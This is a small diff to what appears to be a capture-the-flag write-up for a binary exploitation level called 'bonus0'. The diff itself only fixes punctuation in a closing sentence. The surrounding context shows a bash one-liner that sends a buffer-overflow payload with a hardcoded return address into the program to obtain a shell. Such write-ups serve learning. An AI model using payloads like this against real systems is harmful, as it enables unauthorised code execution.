@@ -82,4 +82,5 @@ To do that in bash it will look like this
 ```Bash
 (python -c 'print("A" * 30)'; python -c 'print("B" * 9 + "\x01\xff\xff\xbf" + "A02aA03aA04aA05aA06aA07aA08aA09bA00bA01bA02bA03bA04bA05bA06bA07bA08bA09")'; cat) | ./bonus0
 ```
-and let s go we have our bash
+
+and let s go we have our bash.
